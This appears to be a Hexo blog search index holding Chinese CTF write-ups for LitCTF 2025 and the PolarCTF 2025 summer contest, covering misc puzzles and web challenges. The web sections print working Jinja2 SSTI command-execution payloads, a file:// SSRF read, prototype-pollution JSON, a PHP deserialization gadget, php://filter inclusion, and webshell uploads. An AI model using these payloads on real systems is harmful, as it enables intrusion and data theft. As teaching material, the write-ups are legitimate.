@@ -1,0 +1,321 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>LitCTF2025赛题复现</title>
+    <url>/2025/05/28/LitCTF2025%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="LitCTF2025赛题复现"><a href="#LitCTF2025赛题复现" class="headerlink" title="LitCTF2025赛题复现"></a>LitCTF2025赛题复现</h1><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="LitCTF-2025-灵感菇🍄哩菇哩菇哩哇擦灵感菇灵感菇🍄"><a href="#LitCTF-2025-灵感菇🍄哩菇哩菇哩哇擦灵感菇灵感菇🍄" class="headerlink" title="[LitCTF 2025]灵感菇🍄哩菇哩菇哩哇擦灵感菇灵感菇🍄"></a>[LitCTF 2025]灵感菇🍄哩菇哩菇哩哇擦灵感菇灵感菇🍄</h3><p>源代码中有github网址</p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250527122720259.png" alt="image-20250527122720176" loading="lazy"></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">https://github.com/ProbiusOfficial/Lingicrypt</span><br></pre></td></tr></table></figure>
+
+<p>找到源码加解密的原理：</p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250527123152565.png" alt="image-20250527123152268" loading="lazy"></p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250527124114434.png" alt="image-20250527124114321" loading="lazy"></p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250527124223485.png" alt="image-20250527124223446" loading="lazy"></p>
+<h3 id="LitCTF-2025-Cropping"><a href="#LitCTF-2025-Cropping" class="headerlink" title="[LitCTF 2025]Cropping"></a>[LitCTF 2025]Cropping</h3><p>加密压缩包，查看十六进制，伪加密，将9改为0</p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250527124848671.png" alt="image-20250527124848604" loading="lazy"></p>
+<p>解压后拿到很多图片：</p>
+<p>图片有编号，拼图二维码</p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250527124938216.png" alt="image-20250527124938166" loading="lazy"></p>
+<p>一把梭了</p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250527125504336.png" alt="image-20250527125504303" loading="lazy"></p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250527125558891.png" alt="image-20250527125558843" loading="lazy"></p>
+<h3 id="LitCTF-2025-像素中的航班"><a href="#LitCTF-2025-像素中的航班" class="headerlink" title="[LitCTF 2025]像素中的航班"></a>[LitCTF 2025]像素中的航班</h3><p>小李要去参见长城杯了，他乘坐的哪趟航班？flag格式:LitCTF{航班号}</p>
+<p>社工题：</p>
+<p>中国南方航空</p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250527125815812.png" alt="image-20250527125815597" loading="lazy"></p>
+<p>4月28号参加长城杯，郑州—福州</p>
+<p>测试后，CZ8289为正确航班号</p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250527131139036.png" alt="image-20250527131138783" loading="lazy"></p>
+<h3 id="LitCTF-2025-消失的文字"><a href="#LitCTF-2025-消失的文字" class="headerlink" title="[LitCTF 2025]消失的文字"></a>[LitCTF 2025]消失的文字</h3><p>USB鼠标流量，CTFNet一把梭</p>
+<p>拿到信息：</p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250527131405232.png" alt="image-20250527131405143" loading="lazy"></p>
+<p>拿到密码：868F-83BD-FF</p>
+<p>解压后拿到文本，有很多不可见字符：</p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250527131648700.png" alt="image-20250527131648659" loading="lazy"></p>
+<p>查看十六进制数据，出现了很多F3 A0 84和F3 A0 85</p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250527132157280.png" alt="image-20250527132157204" loading="lazy"></p>
+<p>这里查看了<a href="https://home.cnblogs.com/u/Rxuxin/">Rxuxin</a>师傅的博客，思路是：</p>
+<ul>
+<li>如果第三个字节是 <code>0x85</code>，则将第四个字节加上 <code>0xd0</code>（十进制 208）</li>
+<li>如果第三个字节是 <code>0x84</code>，则将第四个字节加上 <code>0x90</code>（十进制 144）</li>
+<li>结果对 <code>256</code> 取模</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1.txt&quot;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f,<span class="built_in">open</span>(<span class="string">&#x27;2.txt&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f_out:</span><br><span class="line">    data = f.read()</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(data) - <span class="number">3</span>: <span class="comment"># 防止溢出</span></span><br><span class="line">        <span class="keyword">if</span> data[i] == <span class="number">0xf3</span> <span class="keyword">and</span> data[i+<span class="number">1</span>] == <span class="number">0xa0</span>:</span><br><span class="line">            char = data[i+<span class="number">2</span>]</span><br><span class="line">            add_char = data[i+<span class="number">3</span>]</span><br><span class="line">            add_value1 = <span class="number">0xd0</span></span><br><span class="line">            add_value2 = <span class="number">0x90</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> char == <span class="number">0x85</span>:</span><br><span class="line">                result = (add_char+add_value1)%<span class="number">256</span></span><br><span class="line">            <span class="keyword">elif</span> char == <span class="number">0x84</span>:</span><br><span class="line">                result = (add_char+add_value2)%<span class="number">256</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">            f_out.write(<span class="built_in">bytes</span>([result]))</span><br><span class="line">            </span><br><span class="line">            i += <span class="number">4</span>  <span class="comment">#处理结束，跳过四个字节</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            i += <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">LitCTF&#123;<span class="number">39553317</span>-df30-<span class="number">4951</span>-8aad-fcaf3028ca9d&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="LitCTF-2025-星愿信箱"><a href="#LitCTF-2025-星愿信箱" class="headerlink" title="[LitCTF 2025]星愿信箱"></a>[LitCTF 2025]星愿信箱</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">SSTI漏洞，并且过滤了&#123;&#123;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250527135807569.png" alt="image-20250527135807511" loading="lazy"></p>
+<p>武器库一把梭了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%<span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()%&#125;&#123;%<span class="keyword">if</span> i.__name__ ==<span class="string">&#x27;_wrap_close&#x27;</span>%&#125;&#123;%<span class="built_in">print</span> i.__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;dir&#x27;</span>).read()%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250527140216763.png" alt="image-20250527140216603" loading="lazy"></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;aa&#123;%for i in &#x27;&#x27;.__class__.__base__.__subclasses__()%&#125;&#123;%if i.__name__ ==&#x27;_wrap_close&#x27;%&#125;&#123;%print i.__init__.__globals__[&#x27;popen&#x27;](&#x27;more /flag&#x27;).read()%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250527140341223.png" alt="image-20250527140341047" loading="lazy"></p>
+<h3 id="LitCTF-2025-easy-file"><a href="#LitCTF-2025-easy-file" class="headerlink" title="[LitCTF 2025]easy_file"></a>[LitCTF 2025]easy_file</h3><p>扫描目录：</p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250527141144705.png" alt="image-20250527141144651" loading="lazy"></p>
+<p>登录页面存在弱口令：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">admin</span><br><span class="line">password</span><br></pre></td></tr></table></figure>
+
+
+
+<p>上传文件页面存在waf，且能上传图片</p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250527141619272.png" alt="image-20250527141619208" loading="lazy"></p>
+<p>查看页面源码，file查看图像：</p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250527141731196.png" alt="image-20250527141731131" loading="lazy"></p>
+<p>可以实现文件读取，利用文件包含图片马</p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250527142325066.png" alt="image-20250527142324999" loading="lazy"></p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250527142245363.png" alt="image-20250527142245013" loading="lazy"></p>
+<h3 id="LitCTF-2025-easy-signin"><a href="#LitCTF-2025-easy-signin" class="headerlink" title="[LitCTF 2025]easy_signin"></a>[LitCTF 2025]easy_signin</h3><p>页面403，扫描目录</p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250528085444410.png" alt="image-20250528085437242" loading="lazy"></p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250528085815182.png" alt="image-20250528085815125" loading="lazy"></p>
+<p>找到登录页面，登录有严格校验，发现源码中有api接口：</p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250528093017585.png" alt="image-20250528093017526" loading="lazy"></p>
+<p>这里php协议被禁用，但file协议可以实现任意文件读取</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://node6.anna.nssctf.cn:<span class="number">20128</span>/api/sys/urlcode.php?url=file:///var/www/html/api/sys/urlcode.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250528094042057.png" alt="image-20250528094041663" loading="lazy"></p>
+<p>访问327a6c4304ad5938eaf0efb6cc3e53dc.php</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://node6.anna.nssctf.cn:<span class="number">20128</span>/327a6c4304ad5938eaf0efb6cc3e53dc.php</span><br></pre></td></tr></table></figure>
+
+<p>拿到flag</p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250528094405989.png" alt="image-20250528094405802" loading="lazy"></p>
+<h3 id="LitCTF-2025-nest-js"><a href="#LitCTF-2025-nest-js" class="headerlink" title="[LitCTF 2025]nest_js"></a>[LitCTF 2025]nest_js</h3><p>弱口令登录admin&#x2F;password拿到flag</p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250528094456464.png" alt="image-20250528094456272" loading="lazy"></p>
+<h3 id="LitCTF-2025-多重宇宙日记"><a href="#LitCTF-2025-多重宇宙日记" class="headerlink" title="[LitCTF 2025]多重宇宙日记"></a>[LitCTF 2025]多重宇宙日记</h3><p>exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;settings&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__proto__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;isAdmin&quot;</span>: true</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>2025比赛归纳</category>
+      </categories>
+      <tags>
+        <tag>CTF赛事</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2025PolarCTF夏季挑战赛个人WP-misc部分复现</title>
+    <url>/2025/06/24/2025PolarCTF%E5%A4%8F%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B%E4%B8%AA%E4%BA%BAWP-misc%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="2025PolarCTF夏季挑战赛个人WP-misc部分复现"><a href="#2025PolarCTF夏季挑战赛个人WP-misc部分复现" class="headerlink" title="2025PolarCTF夏季挑战赛个人WP-misc部分复现"></a>2025PolarCTF夏季挑战赛个人WP-misc部分复现</h1><h3 id="秘密的消息"><a href="#秘密的消息" class="headerlink" title="秘密的消息"></a>秘密的消息</h3><h4 id="第一层"><a href="#第一层" class="headerlink" title="第一层"></a>第一层</h4><p>@^bp^o，根据背景，凯撒解密</p>
+<p>mode2 移位3时拿到密钥: Caesar</p>
+<h4 id="第二层"><a href="#第二层" class="headerlink" title="第二层"></a>第二层</h4><p>👉👦👤👘</p>
+<p>一眼base100，解密拿到密码</p>
+<h4 id="第三层"><a href="#第三层" class="headerlink" title="第三层"></a>第三层</h4><p>一眼base64，解密拿到flag</p>
+<h3 id="狂热粉丝"><a href="#狂热粉丝" class="headerlink" title="狂热粉丝"></a>狂热粉丝</h3><p>双击ovf文件打开虚拟机</p>
+<h4 id="题1"><a href="#题1" class="headerlink" title="题1"></a>题1</h4><p> 1.黑客在虚拟机内使用什么交流的？</p>
+<p>查看浏览器历史记录：</p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250623174253028.png" alt="image-20250623174252900" loading="lazy"></p>
+<p>Tinode</p>
+<h4 id="题2"><a href="#题2" class="headerlink" title="题2"></a>题2</h4><p>2.黑客传输的木马名为什么？</p>
+<p>在Program目录下有一个很特殊的exe文件：<br><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250623174642429.png" alt="image-20250623174642347" loading="lazy"></p>
+<p>NewWorld.exe</p>
+<h4 id="题3"><a href="#题3" class="headerlink" title="题3"></a>题3</h4><p> 3.黑客使用什么语言编程的木马？</p>
+<p>查看源码得知为python</p>
+<p>python</p>
+<h4 id="题4"><a href="#题4" class="headerlink" title="题4"></a>题4</h4><p> 4.黑客搭建网站的IP是多少？</p>
+<p>查看历史记录得知ip</p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250623175512821.png" alt="image-20250623175512765" loading="lazy"></p>
+<h4 id="题5"><a href="#题5" class="headerlink" title="题5"></a>题5</h4><p> 5.黑客木马勒索加密了什么文件？、</p>
+<p>查看program目录下的main.py文件</p>
+<p>得知是加密了cmd.exe文件：</p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250623174930468.png" alt="image-20250623174930407" loading="lazy"></p>
+<h4 id="题6"><a href="#题6" class="headerlink" title="题6"></a>题6</h4><p> 6.黑客的内部群聊地址是多少</p>
+<p>github上搜索Tinode源码，搭建Tinode</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">docker network create tinode-net</span><br><span class="line"></span><br><span class="line">docker run --name mysql --network tinode-net --restart always \</span><br><span class="line">  --env MYSQL_ALLOW_EMPTY_PASSWORD=yes -d mysql:<span class="number">5.7</span></span><br><span class="line"></span><br><span class="line">docker run -p <span class="number">6060</span>:<span class="number">6060</span> -d --name tinode-srv --network tinode-net \</span><br><span class="line">  tinode/tinode-mysql:latest</span><br><span class="line"></span><br><span class="line">docker cp ***.sql mysql:/tmp/init.sql </span><br><span class="line"></span><br><span class="line">docker <span class="built_in">exec</span> -it mysql bash</span><br><span class="line"></span><br><span class="line">mysql -u root</span><br><span class="line"></span><br><span class="line">CREATE DATABASE tinode;</span><br><span class="line">USE tinode;</span><br><span class="line"></span><br><span class="line">SOURCE /tmp/init.sql;</span><br><span class="line"></span><br><span class="line">exit;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250623183321258.png" alt="image-20250623183321211" loading="lazy"></p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250623183254414.png" alt="image-20250623183254281" loading="lazy"></p>
+<p>grp93xtyNFZXes</p>
+<h3 id="jumpsever"><a href="#jumpsever" class="headerlink" title="jumpsever"></a>jumpsever</h3><p>根据题目，附件为完整虚拟机，且是jumpserver开源堡垒机</p>
+<p>启动堡垒机：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cd /opt/jumpserver-installer-v4<span class="number">.8</span><span class="number">.1</span></span><br><span class="line">./jmsctl.sh  start</span><br></pre></td></tr></table></figure>
+
+<p>启动后访问客户端：弱密码：admin&#x2F;123456</p>
+<h4 id="题1-1"><a href="#题1-1" class="headerlink" title="题1"></a>题1</h4><p> 1.攻击者的ip</p>
+<p>审计台查看登录日志</p>
+<p>发现攻击者ip：</p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250623161903058.png" alt="image-20250623161902954" loading="lazy"></p>
+<p>flag{192.168.20.1}</p>
+<h4 id="题2-1"><a href="#题2-1" class="headerlink" title="题2"></a>题2</h4><p> 2.攻击者第一次攻击的时间</p>
+<p>如题一：</p>
+<p>flag{2025&#x2F;04&#x2F;07 19:27:39}</p>
+<h4 id="题3-1"><a href="#题3-1" class="headerlink" title="题3"></a>题3</h4><p> 3.Flag标签的md532小写值</p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250623162423057.png" alt="image-20250623162422959" loading="lazy"></p>
+<p>flag{7976e84b35681b027b711652dc0a3ed3}</p>
+<h4 id="题4-1"><a href="#题4-1" class="headerlink" title="题4"></a>题4</h4><p> 4.网站的用户数量</p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250623162618081.png" alt="image-20250623162617976" loading="lazy"></p>
+<p>flag{6}</p>
+<h4 id="题5-1"><a href="#题5-1" class="headerlink" title="题5"></a>题5</h4><p> 5.连接员工信息资产的账号有多少</p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250623162608456.png" alt="image-20250623162608238" loading="lazy"></p>
+<p>flag{2}</p>
+<h3 id="最爱的专辑"><a href="#最爱的专辑" class="headerlink" title="最爱的专辑"></a>最爱的专辑</h3><p>题目给的base64解码结果为：我爱火星哥</p>
+<p>deepsound发现隐藏加密文件，解密拿到压缩包</p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250624153519625.png" alt="image-20250624153519548" loading="lazy"></p>
+<p>拿到apt.jpg和短信信息文件夹</p>
+<p>图片中发现压缩包</p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250624153936397.png" alt="image-20250624153936341" loading="lazy"></p>
+<p>解压密码就是短信信息了</p>
+<p>提示九键，尝试九键解密</p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250624154337141.png" alt="image-20250624154337086" loading="lazy"></p>
+<p>解压密码是Bruno Mars</p>
+<h3 id="为什么关机又关机"><a href="#为什么关机又关机" class="headerlink" title="为什么关机又关机"></a>为什么关机又关机</h3><p>bat中是关机脚本。很明显下面有0宽隐写</p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250624155241522.png" alt="image-20250624155241355" loading="lazy"></p>
+<p>但是常见网址无法解密，在特殊网站可以解密<a href="https://33tool.com/text_cloak/#show">文字隐藏加密&#x2F;解密 - 蜻蜓在线工具</a></p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250624155554058.png" alt="image-20250624155553940" loading="lazy"></p>
+<p>解密后拿到exe，文件属性有问题</p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250624155707481.png" alt="image-20250624155707415" loading="lazy"></p>
+<p>最后的jpg使用steghide隐写，密码为图片中威力的计算结果160</p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250624160635267.png" alt="image-20250624160635170" loading="lazy"></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">steghide extract -sf 女王威力很强奥.jpg -p <span class="string">&quot;160&quot;</span></span><br><span class="line">	wrote extracted data to <span class="string">&quot;flag.txt&quot;</span>.</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="doro"><a href="#doro" class="headerlink" title="doro"></a>doro</h3><p>提取出gif的帧间隔，可以发现帧间隔存在60和30</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;60&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;60&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;60&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;60&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;60&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;60&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;60&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;60&#x27;</span>, <span class="string">&#x27;60&#x27;</span>, <span class="string">&#x27;60&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;60&#x27;</span>, <span class="string">&#x27;60&#x27;</span>, <span class="string">&#x27;60&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;60&#x27;</span>, <span class="string">&#x27;60&#x27;</span>, <span class="string">&#x27;60&#x27;</span>, <span class="string">&#x27;60&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;60&#x27;</span>, <span class="string">&#x27;60&#x27;</span>, <span class="string">&#x27;60&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;60&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>, <span class="string">&#x27;30&#x27;</span>]</span><br></pre></td></tr></table></figure>
+
+<p>并且帧的个数和房间号相匹配。将帧为60的房间号提取出来。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>,<span class="number">4</span>,<span class="number">15</span>,<span class="number">20</span>,<span class="number">22</span>,<span class="number">25</span>,<span class="number">29</span>,<span class="number">33</span>,<span class="number">34</span>,<span class="number">35</span>,<span class="number">37</span>,<span class="number">38</span>,<span class="number">39</span>,<span class="number">57</span>,<span class="number">58</span>,<span class="number">59</span>,<span class="number">60</span>,<span class="number">65</span>,<span class="number">66</span>,<span class="number">67</span>,<span class="number">72</span></span><br></pre></td></tr></table></figure>
+
+<p>hint中提到2025年5月1日0时，注意到文件的修改时间很特殊，用其时间戳做差，转为ASCII码，提取出来帧为60的房间号对应的ASCII码</p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250624162040739.png" alt="image-20250624162040673" loading="lazy"></p>
+<p>最后拿到结果：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dorolikestoeatoranges</span><br></pre></td></tr></table></figure>
+
+<p>解压拿到flag</p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250624162258689.png" alt="image-20250624162258626" loading="lazy"></p>
+]]></content>
+      <categories>
+        <category>2025比赛归纳</category>
+      </categories>
+      <tags>
+        <tag>CTF赛事</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2025PolarCTF夏季挑战赛个人WP-Web部分复现</title>
+    <url>/2025/06/25/2025PolarCTF%E5%A4%8F%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B%E4%B8%AA%E4%BA%BAWP-Web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="2025PolarCTF夏季挑战赛个人WP-Web部分复现"><a href="#2025PolarCTF夏季挑战赛个人WP-Web部分复现" class="headerlink" title="2025PolarCTF夏季挑战赛个人WP-Web部分复现"></a>2025PolarCTF夏季挑战赛个人WP-Web部分复现</h1><h3 id="简单的链子"><a href="#简单的链子" class="headerlink" title="简单的链子"></a>简单的链子</h3><p>源码如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    public $cmd;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        <span class="keyword">if</span> (isset($this-&gt;cmd)) &#123;</span><br><span class="line">            system($this-&gt;cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isset($_GET[<span class="string">&#x27;data&#x27;</span>])) &#123;</span><br><span class="line">    $data = $_GET[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="meta">    @unserialize(<span class="params">$data</span>);</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>简单的反序列化，destruct作为入口，参数cmd构造命令执行</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line">    public $cmd = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$data = new A();</span><br><span class="line">echo serialize($data);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250623144653066.png" alt="image-20250623144652878" loading="lazy"></p>
+<h3 id="渗透之王"><a href="#渗透之王" class="headerlink" title="渗透之王"></a>渗透之王</h3><p>扫描目录，发现源码泄露（<a href="http://www.zip），和新的路由（admin.php拿到提示—>polarctf）">www.zip），和新的路由（admin.php拿到提示—&gt;polarctf）</a></p>
+<p>在新的路由中发现hint：非法的文件包含请求</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://c143e0cf-59ad-<span class="number">4315</span>-a2a8-b5476ac450cf.www.polarctf.com:<span class="number">8090</span>/polarctf/?page=hint.php</span><br></pre></td></tr></table></figure>
+
+
+
+<p>源码被加密，尝试使用密码：polarctf，成功解压</p>
+<p>拿到密码字典：</p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250623145441964.png" alt="image-20250623145441922" loading="lazy"></p>
+<p>字典爆破：</p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250623145724876.png" alt="image-20250623145724810" loading="lazy"></p>
+<p>结果登录上还是跳转到了我一开始拿到的路由…………</p>
+<p>尝试文件包含读取hint.php源码</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://c143e0cf-59ad-<span class="number">4315</span>-a2a8-b5476ac450cf.www.polarctf.com:<span class="number">8090</span>/polarctf/?page=php://<span class="built_in">filter</span>/convert.base64-encode/resource=hint.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250623150934064.png" alt="image-20250623150933974" loading="lazy"></p>
+<p>发现有upload路由，简单的一句话木马，content-type绕过</p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250623151412909.png" alt="image-20250623151412790" loading="lazy"></p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250623151638485.png" alt="image-20250623151638443" loading="lazy"></p>
+<h3 id="命运石之门"><a href="#命运石之门" class="headerlink" title="命运石之门"></a>命运石之门</h3><p>登录页面，密码错误和验证码错误回显不一样</p>
+<p>目录扫描</p>
